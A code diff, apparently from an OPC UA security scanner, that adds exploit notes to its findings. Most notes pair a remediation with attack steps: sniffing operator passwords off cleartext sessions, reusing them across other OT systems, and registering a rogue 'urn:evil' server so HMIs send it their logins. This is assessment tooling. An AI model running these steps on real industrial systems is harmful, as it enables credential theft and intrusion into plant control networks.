@@ -950,10 +950,12 @@ def opcua_targets(hosts: list[Host]) -> list[dict]:
     return out
 
 
-def _finding(sev, title, target, detail, cmd, rem, cwes, kind=""):
+def _finding(sev, title, target, detail, cmd, rem, cwes, kind="",
+             exploit_note="", depth_tier=""):
     return {"severity": sev, "title": title, "target": target, "detail": detail,
             "tool": "opcua-client", "command": cmd, "remediation": rem,
-            "cwes": cwes, "kind": kind}
+            "cwes": cwes, "kind": kind,
+            "exploit_note": exploit_note, "depth_tier": depth_tier}
 
 
 def _endpoint_short(ep: dict) -> str:
@@ -985,7 +987,11 @@ def findings(hosts: list[Host], probes: dict | None = None) -> list[dict]:
                 f"opcua-client discover opc.tcp://{h.ip}:{p.portid}",
                 "Place OPC UA on an isolated OT VLAN. Restrict Discovery "
                 "(GetEndpoints / FindServers) to trusted management hosts.",
-                ["CWE-284", "CWE-306"], kind="opcua_reachable"))
+                ["CWE-284", "CWE-306"], kind="opcua_reachable",
+                exploit_note=(
+                    "opcua-client discover opc.tcp://<ip>:4840; opcua-client "
+                    "get-endpoints opc.tcp://<ip>:4840."),
+                depth_tier="t1"))
 
             # Endpoint fingerprint (informational — feeds the other findings).
             if endpoints:
@@ -1037,7 +1043,14 @@ def findings(hosts: list[Host], probes: dict | None = None) -> list[dict]:
                     "identity, and pair with SecurityMode=SignAndEncrypt so "
                     "the identity cannot be intercepted.",
                     ["CWE-306", "CWE-284", "CWE-1263"],
-                    kind="opcua_anonymous_allowed"))
+                    kind="opcua_anonymous_allowed",
+                    exploit_note=(
+                        "opcua-client browse --anonymous opc.tcp://<ip>:4840/ "
+                        "i=84; if browse returns children, opcua-client read "
+                        "--anonymous opc.tcp://<ip>:4840/ 'ns=0;i=2258' "
+                        "(ServerStatus) — dumps SDK build, start-time, "
+                        "current-time — proves anon session works."),
+                    depth_tier="t1"))
 
             if mode_none_eps:
                 urls = sorted({e.get("endpoint_url", "") for e in mode_none_eps})
@@ -1055,7 +1068,13 @@ def findings(hosts: list[Host], probes: dict | None = None) -> list[dict]:
                     "Disable SecurityMode=None on every endpoint; require Sign "
                     "or SignAndEncrypt with Basic256Sha256 or Aes*_Sha256_Rsa* "
                     "policies end-to-end.",
-                    ["CWE-319", "CWE-311"], kind="opcua_security_mode_none"))
+                    ["CWE-319", "CWE-311"], kind="opcua_security_mode_none",
+                    exploit_note=(
+                        "opcua-client connect --none opc.tcp://<ip>:4840 && "
+                        "tcpdump -w /tmp/ua.pcap -i any 'host <ip> and port "
+                        "4840' && Wireshark decode-as OPCUA — observe cleartext "
+                        "ReadResponse bodies."),
+                    depth_tier="t1"))
 
             if cleartext_creds_eps:
                 urls = sorted({e.get("endpoint_url", "") for e in cleartext_creds_eps})
@@ -1073,7 +1092,14 @@ def findings(hosts: list[Host], probes: dict | None = None) -> list[dict]:
                     "Require a non-None SecurityPolicy for every UserName "
                     "UserTokenPolicy (Basic256Sha256 minimum) so the password "
                     "field is RSA-wrapped to the server certificate.",
-                    ["CWE-319", "CWE-522"], kind="opcua_credentials_in_cleartext"))
+                    ["CWE-319", "CWE-522"], kind="opcua_credentials_in_cleartext",
+                    exploit_note=(
+                        "tcpdump -w /tmp/ua.pcap 'host <ip> and port 4840'; "
+                        "wait for legitimate operator login; extract password "
+                        "from ActivateSessionRequest.UserIdentityToken (visible "
+                        "ASCII in the None-policy path). Attempt harvested "
+                        "creds against every OT system."),
+                    depth_tier="t1"))
 
             if deprecated_eps:
                 pols = sorted({name for _ep, name in deprecated_eps})
@@ -1205,7 +1231,14 @@ def findings(hosts: list[Host], probes: dict | None = None) -> list[dict]:
                     "RegisterServer / RegisterServer2, or restrict the service "
                     "to loopback / an ACL of on-host registrants.",
                     ["CWE-345", "CWE-306"],
-                    kind="opcua_open_lds_registration"))
+                    kind="opcua_open_lds_registration",
+                    exploit_note=(
+                        "Launch attacker OPC UA server (open62541 server_ctt) "
+                        "on attacker IP; opcua-client register-server "
+                        "opc.tcp://<lds>:4840 --serverUri urn:evil --discoveryUrl "
+                        "opc.tcp://<attacker>:4840/. Wait for HMI connections in "
+                        "Wireshark; harvest UserName tokens."),
+                    depth_tier="t1"))
 
             # ERR banner (SDK version leak).
             err = pr.get("err_banner") or {}
